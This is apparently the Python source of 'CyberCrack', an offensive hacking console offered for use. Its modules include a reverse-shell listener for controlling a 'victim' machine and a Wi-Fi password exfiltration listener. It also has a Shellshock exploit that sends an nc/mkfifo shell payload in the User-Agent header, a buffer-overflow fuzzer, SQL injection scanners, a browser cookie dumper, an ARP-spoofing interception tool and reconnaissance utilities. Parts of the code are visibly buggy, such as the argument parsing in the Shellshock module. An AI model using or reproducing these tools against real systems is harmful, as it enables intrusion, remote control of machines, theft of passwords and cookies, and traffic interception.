from colorama import *
init()
import socket
import time
import base64
from pprint import pprint
from ipwhois import IPWhois
from netaddr import *
from scapy.all import *
red = Fore.RED
reset = Fore.RESET
class cybercrack:
        class payloads:
            def __init__(self):
                junk = "Get"
            def windows_cybershell_rev_tcp(self):
                def options():
                    self = "bye"
                    print(r"""
                      Options                      Usage                   optional/neccesary
                :   LHOST                 | LHOST (yourip)           |          neccesary
                :   LPORT                 | LPORT (Listner port)     |          neccesary
                :   exploit/run           | exploit or run           |          neccesary 
                :   ExitOnSession         | ExitOnSession True/False |          neccesary
                :   Main()                | Main() exit this module  |          optional
        
                    """)

                def CyberShel():
                    print(r"""
                       Command                     Usage                                                special/not
                :   Download       | Download a file from target |                                    Special
                :   Upload         | Upload a file from ur machine to target|                         Special
                :   Shutdown       | Shutdown the target system (CyberShell will also die) |          Special
                :   Restart        | Restart the target system (CyberShell will also die)  |          Special
                :   Exit.session   | Exit the session |                                               Not
                :   ChangeDir      | Change the current directory to the directory of your choice |   Special
                :   Session.help   | Show help message |                                              Not
                :   PublicIp       | Show the public ip of the target |                               Special
                :   SysInfo        | Show all the info about the target system |                      Special
                    """)

                while True:
                    try:
                        CybershellInput = input("CyberCrack: windows/CyberShell/rev_tcp > ")
                        lhoststr = "LHOST "
                        lportstr = "LPORT "
                        if CybershellInput == "Options.module" or CybershellInput == "options.module":
                            options()
                        elif CybershellInput == "Options.session" or CybershellInput == "options.session":
                            CyberShel()
                        elif lhoststr in CybershellInput:
                            ipforshell = CybershellInput.replace(lhoststr, '')
                            LHOST = str(ipforshell)
                            print("LHOST = " + LHOST)
                        elif lportstr in CybershellInput:
                            portforshell = CybershellInput.replace(lportstr, '')
                            LPORT = int(portforshell)
                            print("LPORT = " + str(LPORT))
                        elif CybershellInput == "Sys.crash":
                            print("hello")
                        elif CybershellInput == "Main()":
                            break

                        elif CybershellInput == "Exploit" or CybershellInput == "run" or CybershellInput == "exploit":
                            try:
                                while True:
                                    try:
                                        import socket
                                        import pickle
                                        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                                        listener.bind((LHOST, LPORT))
                                        listener.listen(0)
                                        print(Fore.BLUE + "[+] " + Fore.RESET + "Started to listen on " + LHOST + ":" + str(
                                            LPORT))
                                        connection, addr = listener.accept()
                                        print(Fore.BLUE + "[+] " + Fore.RESET + "Victim connected")

                                        def write_file(path, content):
                                            with open(path, "wb") as file:
                                                file.write(content)
                                                print("[+] Download Successful")

                                        def read_file(file):
                                            with open(file, "rb") as to_upload:
                                                content = to_upload.read()
                                            connection.send(content)


                                        def reliable_recv():
                                            result = connection.recv(1048576)
                                            result = result.decode()
                                            print(result)

                                        def reliable_send(data):
                                            command = data.encode()
                                            connection.send(command)

                                        try:
                                            while True:
                                                command = input("CyberShell > ")
                                                if command == "Session.help":
                                                    CyberShel()
                                                elif "Download " in command:
                                                    name = command.replace("Download ", "")
                                                    reliable_send(data=command)
                                                    result = connection.recv(1048576)
                                                    content = result
                                                    write_file(name, content=content)
                                                elif "Upload " in command:
                                                    file = command.replace("Upload ", "")
                                                    reliable_send(data=command)
                                                    read_file(file=file)
                                                    message = connection.recv(1024)
                                                    print(message.decode())
                                                elif command == "":
                                                    continue
                                                else:
                                                    reliable_send(data=command)
                                                    reliable_recv()
                                        except KeyboardInterrupt:
                                            quit()
                                    except KeyboardInterrupt:
                                        print(Fore.RED)
                                        print("KeyBoardInterrupt")
                                        print(Fore.RESET)
                                        quit()
                            except socket.error as error:
                                print(red)
                                print("A session couldn't be made because the following reason ")
                                print("Try Giving a correct, available ip and port for the listner to work")
                                print("The error is the following")
                                print(error)
                                print(reset)
                                pass

                        else:
                            print(red)
                            print("Invalid Syntax")
                            print(reset)
                    except KeyboardInterrupt:
                        break
                    except UnboundLocalError:
                        print("[+] Assign required fields. type module.help for more info")

            def Cybercrack_wifi_password(self):
                while True:
                    user_in = input("CyberCrack: CyberCrack/wifi/password > ")
                    if user_in == "show options":
                        def options():
                            print(r"""
        : LHOST                  your ip address
        : LPORT                  any port you set up in the payload
        : run or exploit         run the script
                            """)
                            return  ""
                    elif "LHOST " in user_in:
                        ip = user_in.replace("LHOST ", "")
                        print("LHOST = " + str(ip))
                    elif "LPORT " in user_in:
                        port = user_in.replace("LPORT ", "")
                        print("LPORT = " + str(port))
                    elif user_in == "run" or user_in == "exploit":
                        try:
                            import socket
                            import time
                            green = Fore.LIGHTGREEN_EX
                            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            server.bind((str(ip), int(port)))
                            server.listen(0)
                            print("[+] Listening for encoming connections ")
                            client, addr = server.accept()
                            print("[+] One CyberSession opened.")
                            print("[+] Victim connected. Please wait three seconds")
                            time.sleep(3)
                            data = client.recv(1048576)
                            data = data.decode()
                            print(green + data)
                            try:
                                while True:
                                    command = input("The profile you want the password > ")
                                    client.send(command.encode())
                                    password = client.recv(1048576)
                                    print(green + password.decode())
                            except KeyboardInterrupt:
                                quit()
                            except ConnectionResetError:
                                print("[+] The connection was closed by the target host")
                                quit()
                        except NameError:
                            print("[+] Assign all parameters related to this payload")
                    elif user_in == "help" or user_in == "show options":
                        print(r"""
        : LHOST                             your ip address
        : LPORT                             the port to listen on
        : run or exploit                    run the script         
                        """)
                    else:
                        print(red + "Invalid Syntax" + reset)
        class modules:
            class exploits:
                def shellshock(self):
                    import http.client
                    import urllib
                    def shock(uri, host, port, remote):
                        print("Attempting to exploit CVE-2014-6271 on %s" % (host))
                        print("We will attempt to connect back to %s %s" % (remote, port))
                        conn = http.client.HTTPConnection(host)
                        reverse_shell = "() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" % (remote, port)

                        print("We will use the following shell: " + reverse_shell)
                        headers = {"Content-type": "application/x-www-form-urlencoded",
                                  "User-Agent": reverse_shell}
                        conn.request("GET", uri, headers=headers)
                        res = conn.getresponse()
                        print(res.status, res.reason)
                        data = res.read()
                        print(data)
                    def cmd():
                        while True:
                            try:
                                user_in = input("CyberCrack: Cybercrack/exploits/shellshock > ")
                                if user_in == "help" or user_in == "show options":
                                    print(r"""
: set URI               target uri
: set LHOST             the host to connect back to
: set LPORT             the port to listen on
: set T_IP              target ip
                                    """)
                                elif user_in.startswith("set"):
                                    if user_in.split()[1] == "URI":
                                        print("URI = " + str(user_in[2]))
                                        URI = user_in[2]
                                    elif user_in.split()[1] == "LHOST":
                                        LHOST = user_in[2]
                                        print("LHOST = " + LHOST)
                                    elif user_in.split()[1] == "LPORT":
                                        LPORT = user_in.split()[2]
                                        print("LPORT = " + str(LPORT))
                                    elif user_in.split()[1] == "T_IP":
                                        T_IP = user_in.split()[2]
                                        print("T_IP = " + str(T_IP))
                                    else:
                                        print("[+] Invalid parameter for set")
                                elif user_in == "run" or user_in == "exploit":
                                    shock(uri=URI, host=LHOST, port=LPORT, remote=T_IP)
                            except KeyboardInterrupt:
                                quit()
                            except NameError:
                                print("Assign all values related to this exploit")
                    cmd()
                def Fuzzer(self):
                    def Fuzzer_Help():
                        print(r"""
                        : THOST       | Target Ip |                            Necessary 
                        : TPORT       | Target Port |                          Necessary 
                        : SLEEP       | Time for the program to sleep |        Necessary
                        : JUNK_LENGTH | Data size send to the server |         Necessary
                        : Main()      | Return to main shell |                 Optional
                         """)

                    while True:
                        try:
                            Fuzzer_command = input("\nCyberCrack: CyberCrack/exploits/fuzzer > ")
                            if Fuzzer_command == "Help" or Fuzzer_command == "help":
                                Fuzzer_Help()
                            elif "THOST " in Fuzzer_command:
                                target_ip = Fuzzer_command.replace("THOST ", "")
                                print("THOST = " + str(target_ip))
                            elif "TPORT " in Fuzzer_command:
                                target_port = Fuzzer_command.replace("TPORT ", "")
                                print("TPORT = " + str(target_port))
                            elif "SLEEP " in Fuzzer_command:
                                sleep = Fuzzer_command.replace("SLEEP ", "")
                                print("SLEEP = " + str(sleep))
                            elif "JUNK_LENGTH " in Fuzzer_command:
                                lenght = Fuzzer_command.replace("JUNK_LENGTH ", "")
                                print("JUNK_LENGTH = " + str(lenght))
                            elif Fuzzer_command == "show options":
                                print(r"""
                                                : JUNK_LENGTH 'buffer size'
                                                : SLEEP 'time to rest'
                                                : TPORT 'target port'
                                                : THOST 'target host'
                                                """)
                            elif Fuzzer_command == "Main()" or Fuzzer_command == "main()":
                                break
                            elif Fuzzer_command == "Exploit" or Fuzzer_command == "run":
                                try:
                                    buff_size = int(lenght)
                                    check = int(lenght)
                                    while True:
                                        try:
                                            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            conn.connect((target_ip, int(target_port)))
                                            junk = "A" * buff_size
                                            payload = "GET" + junk + "HTTP/1.1\r\n\r\n"
                                            conn.send(payload.encode("raw_unicode_escape"))
                                            buff_size += int(lenght)
                                            print("\r[+] Payload sent. " + str(buff_size) + " data sent", end="")
                                            conn.close()
                                            time.sleep(int(sleep))
                                        except WindowsError:
                                            if buff_size == check:
                                                print("\r[+] Check the ip, port or if the server is down because an error occured", end="")
                                                break
                                            else:
                                                print("\r[+] An overflow might occured at  " + str(buff_size), end="")
                                                break
                                except NameError:
                                    print(red + "Assign all values related to this exploit" + reset)
                                    continue
                                except KeyboardInterrupt:
                                    break
                                except ValueError:
                                    print("Invalid sleep time")
                                    continue
                            else:
                                print(red + "Invalid Syntax" + reset)
                        except NameError:
                            print(red + "Set all parameters type show options for more info" + reset)
            class CyberServe:
                def CyberServe_scanner_sql_vulnerability(self):
                    import requests
                    from bs4 import BeautifulSoup as bs
                    from urllib.parse import urljoin
                    from pprint import pprint
                    s = requests.Session()
                    s.headers[
                        "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

                    def get_all_forms(url):
                        """Given a `url`, it returns all forms from the HTML content"""
                        soup = bs(s.get(url).content, "html.parser")
                        return soup.find_all("form")

                    def get_form_details(form):
                        """
                        This function extracts all possible useful information about an HTML `form`
                        """
                        details = {}
                        # get the form action (target url)
                        try:
                            action = form.attrs.get("action").lower()
                        except:
                            action = None
                        # get the form method (POST, GET, etc.)
                        method = form.attrs.get("method", "get").lower()
                        # get all the input details such as type and name
                        inputs = []
                        for input_tag in form.find_all("input"):
                            input_type = input_tag.attrs.get("type", "text")
                            input_name = input_tag.attrs.get("name")
                            input_value = input_tag.attrs.get("value", "")
                            inputs.append({"type": input_type, "name": input_name, "value": input_value})
                        # put everything to the resulting dictionary
                        details["action"] = action
                        details["method"] = method
                        details["inputs"] = inputs
                        return details

                    def is_vulnerable(response):
                        """A simple boolean function that determines whether a page
                        is SQL Injection vulnerable from its `response`"""
                        errors = {
                            # MySQL
                            "you have an error in your sql syntax;",
                            "warning: mysql",
                            # SQL Server
                            "unclosed quotation mark after the character string",
                            # Oracle
                            "quoted string not properly terminated",
                        }
                        for error in errors:
                            # if you find one of these errors, return True
                            if error in response.content.decode().lower():
                                return True
                        # no error detected
                        return False

                    def scan_sql_injection(url):
                        # test on URL
                        for c in "\"'":
                            # add quote/double quote character to the URL
                            new_url = f"{url}{c}"
                            print("[!] Trying", new_url)
                            # make the HTTP request
                            res = s.get(new_url)
                            if is_vulnerable(res):
                                # SQL Injection detected on the URL itself,
                                # no need to preceed for extracting forms and submitting them
                                print("[+] SQL Injection vulnerability detected, link:", new_url)
                                return
                        # test on HTML forms
                        forms = get_all_forms(url)
                        print(f"[+] Detected {len(forms)} forms on {url}.")
                        for form in forms:
                            form_details = get_form_details(form)
                            for c in "\"'":
                                # the data body we want to submit
                                data = {}
                                for input_tag in form_details["inputs"]:
                                    if input_tag["value"] or input_tag["type"] == "hidden":
                                        # any input form that has some value or hidden,
                                        # just use it in the form body
                                        try:
                                            data[input_tag["name"]] = input_tag["value"] + c
                                        except:
                                            pass
                                    elif input_tag["type"] != "submit":
                                        # all others except submit, use some junk data with special character
                                        data[input_tag["name"]] = f"test{c}"
                                # join the url with the action (form request URL)
                                url = urljoin(url, form_details["action"])
                                if form_details["method"] == "post":
                                    res = s.post(url, data=data)
                                elif form_details["method"] == "get":
                                    res = s.get(url, params=data)
                                # test whether the resulting page is vulnerable
                                if is_vulnerable(res):
                                    print("[+] SQL Injection vulnerability detected, link:", url)
                                    print("[+] Form:")
                                    pprint(form_details)
                                    break

                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/scanner/website_sql_vulnerability > ")
                            if user_in == "help" or user_in == "show options":
                                print(r"""
                    : set URL       Target url to be scanned
                    : run           Run the scan
                                """)
                            elif user_in.startswith("set") and user_in.split()[1] == "URL":
                                url = user_in.split()[2]
                                print("URL = " + str(url))
                            elif user_in == "run" or user_in == "exploit":

                                url = url
                                print(url)
                                reqs = requests.get(url)
                                soup = bs(reqs.text, 'html.parser')
                                urls = []
                                for link in soup.find_all('a'):
                                    sql = (link.get('href'))
                                    scan_sql_injection(url=sql)
                            else:
                                print("[+] Invalid command")
                        except NameError:
                            print("[+] Assign all parameters related for this exploit")
                            continue
                        except KeyboardInterrupt:
                            break
                def Cyberserve_scanner_webpage_sql_vulnerabilty(self):
                    import requests
                    from bs4 import BeautifulSoup as bs
                    from urllib.parse import urljoin
                    from pprint import pprint
                    s = requests.Session()
                    s.headers[
                        "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

                    def get_all_forms(url):
                        """Given a `url`, it returns all forms from the HTML content"""
                        soup = bs(s.get(url).content, "html.parser")
                        return soup.find_all("form")

                    def get_form_details(form):
                        """
                        This function extracts all possible useful information about an HTML `form`
                        """
                        details = {}
                        # get the form action (target url)
                        try:
                            action = form.attrs.get("action").lower()
                        except:
                            action = None
                        # get the form method (POST, GET, etc.)
                        method = form.attrs.get("method", "get").lower()
                        # get all the input details such as type and name
                        inputs = []
                        for input_tag in form.find_all("input"):
                            input_type = input_tag.attrs.get("type", "text")
                            input_name = input_tag.attrs.get("name")
                            input_value = input_tag.attrs.get("value", "")
                            inputs.append({"type": input_type, "name": input_name, "value": input_value})
                        # put everything to the resulting dictionary
                        details["action"] = action
                        details["method"] = method
                        details["inputs"] = inputs
                        return details

                    def is_vulnerable(response):
                        """A simple boolean function that determines whether a page
                        is SQL Injection vulnerable from its `response`"""
                        errors = {
                            # MySQL
                            "you have an error in your sql syntax;",
                            "warning: mysql",
                            # SQL Server
                            "unclosed quotation mark after the character string",
                            # Oracle
                            "quoted string not properly terminated",
                        }
                        for error in errors:
                            # if you find one of these errors, return True
                            if error in response.content.decode().lower():
                                return True
                        # no error detected
                        return False

                    def scan_sql_injection(url):
                        # test on URL
                        for c in "\"'":
                            # add quote/double quote character to the URL
                            new_url = f"{url}{c}"
                            print("[!] Trying", new_url)
                            # make the HTTP request
                            res = s.get(new_url)
                            if is_vulnerable(res):
                                # SQL Injection detected on the URL itself,
                                # no need to preceed for extracting forms and submitting them
                                print("[+] SQL Injection vulnerability detected, link:", new_url)
                                return
                        # test on HTML forms
                        forms = get_all_forms(url)
                        print(f"[+] Detected {len(forms)} forms on {url}.")
                        for form in forms:
                            form_details = get_form_details(form)
                            for c in "\"'":
                                # the data body we want to submit
                                data = {}
                                for input_tag in form_details["inputs"]:
                                    if input_tag["value"] or input_tag["type"] == "hidden":
                                        # any input form that has some value or hidden,
                                        # just use it in the form body
                                        try:
                                            data[input_tag["name"]] = input_tag["value"] + c
                                        except:
                                            pass
                                    elif input_tag["type"] != "submit":
                                        # all others except submit, use some junk data with special character
                                        data[input_tag["name"]] = f"test{c}"
                                # join the url with the action (form request URL)
                                url = urljoin(url, form_details["action"])
                                if form_details["method"] == "post":
                                    res = s.post(url, data=data)
                                elif form_details["method"] == "get":
                                    res = s.get(url, params=data)
                                # test whether the resulting page is vulnerable
                                if is_vulnerable(res):
                                    print("[+] SQL Injection vulnerability detected, link:", url)
                                    print("[+] Form:")
                                    pprint(form_details)
                                    break
                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/scanner/webpage_sql_vulnerability > ")
                            if user_in == "help" or user_in == "show options":
                                print(r"""
                    : set LINK      Target LINK to be scanned
                    : run           Run the scan
                                """)
                            elif user_in.startswith("set") and user_in.split()[1] == "LINK":
                                url = user_in.split()[2]
                                print("LINK = " + str(url))
                            elif user_in == "run" or user_in == "exploit":
                                scan_sql_injection(url=url)
                            else:
                                print("[+] Invalid command")
                        except NameError:
                            print("[+] Assign all parameters related for this exploit")
                            continue
                        except KeyboardInterrupt:
                            break

                def CyberServe_info_browser_cookies(self):
                    import browser_cookie3
                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/info/browser_cookies > ")
                            if user_in == "help" or user_in == "show options":
                                print(r"""
                    : set BROWSER     -      the target browser. eg- 'firefox, chrome, opera, microsoft-edge'
                    : run or exploit  -      run the script
                                """)
                            elif user_in.startswith("set") and user_in.split()[1] == "BROWSER":
                                if user_in.split()[2] == "firefox":
                                    print("Browser = firefox")
                                    browser = "firefox"
                                elif user_in.split()[2] == "microsoft-edge":
                                    print("Browser = microsoft-edge")
                                    browser = "edge"
                                elif user_in.split()[2] == "opera":
                                    print("Browser = opera")
                                    browser = "opera"
                                elif user_in.split()[2] == "chrome":
                                    print("Browser = chrome")
                                    browser = "chrome"
                                else:
                                    print("[+] Invalid browser")
                            elif user_in == "run" or user_in == "exploit":
                                if browser == "firefox":
                                    cookie = list(browser_cookie3.firefox())
                                    for cookies in cookie:
                                        print(cookies)
                                elif browser == "edge":
                                    cookie = list(browser_cookie3.edge())
                                    for cookies in cookie:
                                        print(cookies)
                                elif browser == "opera":
                                    cookie = list(browser_cookie3.opera())
                                    for cookies in cookie:
                                        print(cookies)
                                elif browser == "chrome":
                                    cookie = list(browser_cookie3.chrome())
                                    for cookies in cookie:
                                        print(cookies)
                        except KeyboardInterrupt:
                            quit()
                        except NameError:
                            print("[+] Assign all parameters related for this module")
                        except browser_cookie3.BrowserCookieError:
                            print("[+] The browser you specified isn't installed on your device")
                def CyberServe_scanner_ports(self):
                   while True:
                       try:
                           PortScannerInput = input("CyberCrack: CyberServe/scanner/tcp_ports > ")
                           if "set THOST " in PortScannerInput:
                               ip_2 = PortScannerInput.replace("set THOST ", "")
                               print("THOST = " + str(ip_2))


                           elif PortScannerInput == "show options" or PortScannerInput == "Show options":
                               def options():
                                   print(r"""
                                  USAGE                         example
                           : set THOST 'targetip'     example 'set LHOST 192.168.1.4'
                           : set SCAN_TILL            the port you wamt to scan till
                           : run or exploit           example 'run'
                                                     """)
                                   return ""
                               options()
                           elif PortScannerInput.startswith("set") and PortScannerInput.split()[1] == "SCAN_TILL":
                               port_till = PortScannerInput.split()[2]
                               print("SCAN_TILL = " + str(port_till))
                           elif PortScannerInput == "run" or PortScannerInput == "exploit":
                               try:
                                   host = ip_2
                                   RESET = reset
                                   GRAY = Fore.LIGHTBLACK_EX
                                   GREEN = Fore.GREEN
                                   def is_port_open(host, port):
                                       s = socket.socket()
                                       try:
                                           s.connect((host, port))
                                       except:
                                           return False
                                       else:
                                           return True

                                   for port in range(1, int(port_till)):
                                       if is_port_open(host, port):
                                           print(f"{GREEN}[+] {host}:{port} is open  - {RESET}" + socket.getservbyport(port, "tcp"))
                                       else:
                                           print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")
                               except KeyboardInterrupt:
                                   print("\n Exitting Program !!!!")
                                   break
                               except socket.gaierror:
                                   print("\n Hostname Could Not Be Resolved !!!!")
                                   quit()
                               except socket.error:
                                   print("\ Server not responding !!!!")
                                   quit()
                           else:
                               print(red + "Invalid Syntax" + reset)
                       except NameError:
                           print(red + "Assign all values and parameters" + reset)
                def Cyberserve_info_website_cookies(self):
                    import requests
                    def help():
                        print(r"""
: set URL           target url to get the cookies
: run or exploit    run the script
                        """)

                    try:
                        def get_cookies(url):
                            session = requests.session()
                            session.get(str(url))
                            cookies = session.cookies
                            for cookie in cookies:
                                print(cookie)
                        while True:
                            try:
                                user_in = input("CyberCrack: CyberServe/info/website_cookies > ")
                                if user_in.startswith("set") and user_in.split()[1] == "URL":
                                    url = str(user_in.split()[2])
                                    print("URL = " + str(user_in.split()[2]))
                                elif user_in == "run" or user_in == "exploit":
                                    get_cookies(url=url)
                                elif user_in == "help" or user_in == "show options":
                                    help()
                                else:
                                    print(red + "Invalid command" + reset)
                            except requests.exceptions.MissingSchema:
                                print("Invalid url. please give the full url with https:// or http://")
                            except requests.exceptions.InvalidSchema as e:
                                print("The url you gave isn't valid")
                                print(e)
                            except requests.exceptions.ConnectionError:
                                print("The target website closed the connection or can't connect to the target url")
                            except NameError:
                                print("[+] Assign all parameters related for this exploit")
                    except Exception as e:
                        print(e)
                def Cyberserve_spoof_arp_spoof(self):
                    def help():
                        print(r"""
: set T_IP               The target ip
: set T_ROUTER           The target router
: run or exploit         run the script
                        """)
                    def arp_spoofer_tool(target, host):
                        import time
                        import os
                        import sys
                        def _enable_linux_iproute():
                            """
                            Enables IP route ( IP Forward ) in linux-based distro
                            """
                            file_path = "/proc/sys/net/ipv4/ip_forward"
                            with open(file_path) as f:
                                if f.read() == 1:
                                    # already enabled
                                    return
                            with open(file_path, "w") as f:
                                print(1, file=f)

                        def _enable_windows_iproute():
                            """
                            Enables IP route (IP Forwarding) in Windows
                            """
                            from services import WService
                            # enable Remote Access service
                            service = WService("RemoteAccess")
                            service.start()

                        def enable_ip_route(verbose=True):
                            """
                            Enables IP forwarding
                            """
                            if verbose:
                                print("[!] Enabling IP Routing...")
                            _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
                            if verbose:
                                print("[!] IP Routing enabled.")

                        def get_mac(ip):
                            """
                            Returns MAC address of any device connected to the network
                            If ip is down, returns None instead
                            """
                            ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
                            if ans:
                                return ans[0][1].src

                        def spoof(target_ip, host_ip, verbose=True):
                            """
                            Spoofs `target_ip` saying that we are `host_ip`.
                            it is accomplished by changing the ARP cache of the target (poisoning)
                            """
                            # get the mac address of the target
                            target_mac = get_mac(target_ip)
                            # craft the arp 'is-at' operation packet, in other words; an ARP response
                            # we don't specify 'hwsrc' (source MAC address)
                            # because by default, 'hwsrc' is the real MAC address of the sender (ours)
                            arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
                            # send the packet
                            # verbose = 0 means that we send the packet without printing any thing
                            send(arp_response, verbose=0)
                            if verbose:
                                # get the MAC address of the default interface we are using
                                self_mac = ARP().hwsrc
                                print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

                        def restore(target_ip, host_ip, verbose=True):
                            """
                            Restores the normal process of a regular network
                            This is done by sending the original informations
                            (real IP and MAC of `host_ip` ) to `target_ip`
                            """
                            # get the real MAC address of target
                            target_mac = get_mac(target_ip)
                            # get the real MAC address of spoofed (gateway, i.e router)
                            host_mac = get_mac(host_ip)
                            # crafting the restoring packet
                            arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
                            # sending the restoring packet
                            # to restore the network to its normal process
                            # we send each reply seven times for a good measure (count=7)
                            send(arp_response, verbose=0, count=7)
                            if verbose:
                                print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
                        verbose = True
                        try:
                            while True:
                                spoof(target, host, verbose)
                                spoof(host, target, verbose)
                                time.sleep(1)
                        except KeyboardInterrupt:
                            print("[!] Detected CTRL+C ! restoring the network, please wait...")
                            restore(target, host)
                            restore(host, target)

                    while True:
                        import scapy.error as scapy_error
                        try:
                            user_in = input("CyberCrack: CyberServe/spoof/arp_spoof > ")
                            if user_in.startswith("set"):
                                if user_in.split()[1] == "T_IP":
                                    target = user_in.split()[2]
                                    print("T_IP = " + str(target))
                                elif user_in.split()[1] == "T_ROUTER":
                                    host = user_in.split()[2]
                                    print("T_ROUTER = " + str(host))
                                else:
                                    print("Invalid parameter for set")
                            elif user_in == "run" or user_in == "exploit":
                                arp_spoofer_tool(target=target, host=host)
                            elif user_in == "help" or user_in == "show options":
                                help()
                            else:
                                print("Invalid command")
                        except KeyboardInterrupt:
                            break
                        except NameError:
                            print("[+] Assign all parameters related for this exploit")
                        except scapy_error.Scapy_Exception:
                            print("[+] Something went wrong check the target, router and connection")
                def Cyberserve_info_subnet_lookup(self):
                    def help():
                        print(r"""
: set THOST           target ip to be tested
: set NET             the network with the CIDR
: run or exploit  run the script
                        """)
                        return ""
                    def net(ip, net):
                        if IPAddress(ip) in IPNetwork(net):
                            print("[+] The ip " + str(ip) + " is in the network " + str(net))
                        else:
                            print("[+] The ip " + str(ip) + " is not in the network " + str(net))
                    while True:
                        try:
                            user_in = input("CyberCrack: Cyberserve/info/subnet_lookup > ")
                            if user_in == "help" or user_in == "show options":
                                help()
                            elif user_in.startswith("set"):
                                if user_in.split()[1] == "THOST":
                                    ip = user_in.split()[2]
                                    print("THOST = " + str(ip))
                                elif user_in.split()[1] == "NET":
                                    network = user_in.split()[2]
                                    print("NET = " + str(network))
                                else:
                                    print("Invalid parameter for set")
                            elif user_in == "run" or user_in == "exploit":
                                net(ip=ip, net=network)
                        except NameError:
                            print("[+] Assign all values related to this module")
                def Cyberserve_info_whois_lookup(self):
                    def help():
                        print(r"""
: set THOST                         Type the target ip address
: run or exploit                    run the script
: Main()                            return to the main shell
                                    as simple as that
                        """)
                        return ""


                    def whois_look(ip):
                        domain = IPWhois(ip)
                        result = domain.lookup_whois()
                        pprint(result)
                    while True:
                        input_user = input("CyberCrack: CyberServe/information/whois_lookup > ")
                        if input_user == "help" or input_user == "show options":
                            help()
                        elif input_user.startswith("set"):
                            parameter = input_user.split()[1]
                            if parameter == "THOST":
                                ip_addr = input_user.split()[2]
                                print("THOST = " + str(ip_addr))
                            else:
                                print("[+] Invalid parameter for set")
                        elif input_user == "run" or input_user == "exploit":
                            try:
                                print("[+] This operation may take a few minutes")
                                whois_look(ip=ip_addr)
                            except NameError:
                                print("[+] Assign all parameters related to this module")
                        elif input_user == "Main()":
                            break
                        elif input_user == "":
                            continue
                        else:
                            print("[+] Invalid syntax")
                def CyberServe_info_extract_weblinks(self):
                    import requests
                    from urllib.parse import urlparse, urljoin
                    from bs4 import BeautifulSoup
                    GREEN = Fore.GREEN
                    GRAY = Fore.LIGHTBLACK_EX
                    RESET = reset
                    import re


                    def crawl(url):
                        url = url
                        reqs = requests.get(url)
                        soup = BeautifulSoup(reqs.text, 'html.parser')

                        urls = []
                        for link in soup.find_all('a'):
                            print(link.get('href'))
                    def help():
                        print(r"""
: set URL                 the target ip
: run or exploit          run the script
                        """)
                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/info/extract_web_links > ")
                            if user_in == "help" or user_in == "show options":
                                help()
                            elif user_in.startswith("set"):
                                ip = user_in.split()[2]
                                if user_in.split()[1] == "URL":
                                    print("URL = " + str(ip))
                                else:
                                    print("[+] Invalid parameter for set")
                            elif user_in == "run" or user_in == "exploit":
                                crawl(url=ip)
                            else:
                                print("[+] Invalid command")
                        except NameError as e:
                            print("[+] Assign all parameters related to this module ")
                            print(e)
                        except requests.exceptions.InvalidSchema:
                            print("[+] Invalid URL")
                        except requests.exceptions.MissingSchema:
                            print("[+] Inculde https:// or http:// in the url")
                def CyberServe_info_geoip(self):
                    def geoip(ip):
                        from geoip import geolite2
                        match = geolite2.lookup(ip)
                        print("Ip address - " + match.ip)
                        print("Country - " + match.country)
                        print("Continent - " + match.continent)
                        print("Timezone - " + match.timezone)
                        print("Location - " + str(match.location))

                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/info/geoip > ")
                            if user_in == "help" or user_in == "show options":
                                print(r"""
                            : set THOST              The target ip address
                            : run                    run the script
                                                        """)
                            elif user_in.startswith("set") and user_in.split()[1] == "THOST":
                                ip = user_in.split()[2]
                                print("THOST = " + str(ip))
                            elif user_in == "run" or user_in == "exploit":
                                geoip(ip=ip)
                            else:
                                print("[+] Invalid command")
                        except NameError:
                            print("[+] Assign al values related to this exploit")







